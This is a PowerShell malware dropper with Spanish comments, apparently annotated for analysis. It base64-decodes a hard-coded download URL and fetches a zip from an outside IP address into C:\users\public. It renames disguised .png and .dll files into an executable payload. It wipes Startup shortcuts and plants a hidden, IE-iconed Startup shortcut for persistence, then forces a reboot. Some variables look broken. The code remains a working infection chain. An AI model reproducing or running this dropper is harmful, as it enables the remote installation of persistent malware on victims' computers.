$exe = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGUA')))   
## tranforma el string de b64 a normal "exe"
$zip = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('egBpAHAA')))	
## tranforma el string de b64 a normal "zip"
$url = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADMANwAuADcANAAuADEANgAyAC4AMgA1AC8ATQAxADEAMAA2AC8AawBrAC8AbQBkAC4AegBpAHAA')))
## tranforma el string de b64 a normal "http://137.74.162.25/M1106/kk/md.zip"

$rutaPublic = "public"  
## asigna el valo public a la variable
$$rutaCompletaPublic = "c:\users\$rutaPublic"    
## asigna el path a una variable

Function funRandom 
{
	$abcdario = "q","w","e","r","t","y","u","p","a","s","d","f","g","h","j","k","z","x","c","v","b","n","m"
	## Crea una lista de letras
	$numeros = "2_","3_","4_","5_","6_","7_","8_","9_"
	## Crea una lista de números
	$nombreRandom = $null  										 					
	## valor null sirve para liberar el espacio en memoria que estaba usando la variable
	$contar6 = Get-Random -InputObject $abcdario -Count 6   					
	## toma letras dinamicas de un rango de 6 letras.
	$contar1 = Get-Random -InputObject $numeros -Count 1    					
	## toma numeros dinamicos de un rango de 1 numero.
	$abcdarioaContar = Get-Random -InputObject $abcdario.ToUpper() -Count 1    
	## Convierte la letra en mayuscula
	
	foreach($n in $contar6) 
	{
		$nombreRandom += $n
	}
	
	foreach ($n2 in $contar1) 
	{
		$nombreRandom += $n2
	}

	foreach ($n3 in $abcdarioa_contar) 
	{
		$nombreRandom += $n3
	}

	return "Java_$nombreRandom"
}
## la funcion genera un nombre de archivo algo parecido a Java_pyqjkz2_Z
## 6 letras como el count 6
## 1 número como el count 1
## Asignar una letra en mayusculo como en abcdarioa_contar

$varfunRandom = funRandom  
## asigna el valor que saca la función a una variable
$rutaAidat = "$$rutaCompletaPublic\i.dat"
## asigna la dirección de un archivo c:\users\public\i.dat
$validandoRutaAidat = if ($rutaAidat) { Test-Path $rutaAidat }
## valida si la direeción es c:\users\public\i.dat
$validandoRutaAidat
## muestra el valor True o False

if($validandoRutaAidat -eq 'True')
{
     exit
} 
else 
{
	New-Item -ItemType directory -Path $$rutaCompletaPublic\$varfunRandom
	## crea un directorio con el nombre obtenido en la funcion random
	$web = new-object System.Net.WebClient
	$web.DownloadFile($url,"$$rutaCompletaPublic\$varfunRandom\$varfunRandom.zip")
	## descarga un archivo de la url que se muetra al inicio dentro del directorio que crea y le asigna el mismonombre con .zip al final
	$shellApp = new-object -com shell.application 
	$var10 = $shellApp.namespace("$$rutaCompletaPublic\$varfunRandom\$varfunRandom.$zip") 
	$var11 = $shellApp.namespace("$$rutaCompletaPublic\$varfunRandom") 
	$var11.Copyhere($var10.items())
	## crear un o
	Rename-Item -NewName ("$$rutaCompletaPublic\$varfunRandom\$varfunRandom.$exe") -Path ("$$rutaCompletaPublic\$varfunRandom\$exe.png")
	Rename-Item -NewName ("$$rutaCompletaPublic\$varfunRandom\$varfunRandom.LNS") -Path ("$$rutaCompletaPublic\$varfunRandom\12.dll")
	Rename-Item -NewName ("$$rutaCompletaPublic\$varfunRandom\sqlite3.dll") -Path ("$$rutaCompletaPublic\$varfunRandom\sql.png")

	function func2
	{
  		Param([string]$func2String1,[string]$func2String2);
  	try
	{  
    		$wscriptShell = New-Object -ComObject WScript.Shell 
		$shortcut = $wscriptShell.CreateShortcut($func2String1) 
    		$shortcut.TargetPath = "$$rutaCompletaPublic\$varfunRandom\$varfunRandom.$exe"       
    		$shortcut.Arguments = " $varfunRandom1.LNS  $varfunRandom"
    		$shortcut.WorkingDirectory = "$$rutaCompletaPublic\$varfunRandom" 
    		$shortcut.WindowStyle = 7   
    		$shortcut.IconLocation = $		([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==')))
    		$shortcut.Save()
  	}
	
	finally{}
	}
	
	$wscriptShell2 = New-Object -Com WScript.Shell
	$startup = $wscriptShell2.SpecialFolders.Item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGEAcgB0AHUAcAA='))));          
	del $startup\*.vbs
	del $startup\*.lnk
	$var12 = 	 	"                                                                                                                                                                                                                                                                                          	  $env:APPDATA\$env1, $env2"
	$var13 = "$startup\$varfunRandom.lnk"  
        
	func2 $var13  $var12

	func2 "c:\users\public\c.lnk"   $var12
	$bytes = [System.IO.File]::ReadAllBytes("c:\users\public\c.lnk")
	$bytes[0x15] = $bytes[0x15] -bor 0x20 #set byte 21 (0x15) bit 6 (0x20) ON
	[System.IO.File]::WriteAllBytes("c:\users\public\c.lnk", $bytes)
	function func2vbs
	{
  		Param([string]$func2vbs_str1,[string]$func2vbs_str2);
	try
	{  
		$var14 = New-Object -ComObject WScript.Shell 
    		$var15 = $var14.CreateShortcut($func2vbs_str1) 
    		$var15.TargetPath = "c:\users\$rutaPublic\$varfunRandom.vbs"      
    		$var15.Arguments = ""
		$var15.Description = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgBBAGMAZQBzAHMAYQByACAAYQAgAGkAbgB0AGUAcgBuAGUAdAAuACIA')));
    		$var15.WorkingDirectory = ""    
    		$var15.IconLocation = "$var21"
    		$var15.Save()
  	}
	finally{}
}

$var16 = $varfunRandom
$var16 | Set-Content "$$rutaCompletaPublic\i.dat"
$var16 | Out-File "$$rutaCompletaPublic\i.dat"
$var16 > "$$rutaCompletaPublic\i.dat"

$var13 = "c:\users\public\chrome.lnk" 
func2vbs $var13  $func2vbs_str2

$var17 = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABpAG4AZQA=')))
$var18 = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBtAGQA')))
$var19 = '86'
$var20 = "$"
$Arquivo = "$$rutaCompletaPublic\$varfunRandom\$varfunRandom1.LNS"

$ArquivoSaida ="$$rutaCompletaPublic\$varfunRandom\$varfunRandom1.LNS"
Add-Content $Arquivo '#NoTrayIcon'
Add-Content $Arquivo "Global $var20$varfunRandom = $var20$var18$var17[1]"
Add-Content $Arquivo "Global $var20$varfunRandom$var19 = DllOpen('$varfunRandom.LNS')"
Add-Content $Arquivo "DllCall($var20$varfunRandom$var19, 'STRUCT', 'JLI_CmdToArgs')"


C:\WINDOWS\system32\shutdown.exe -r -t 200

}
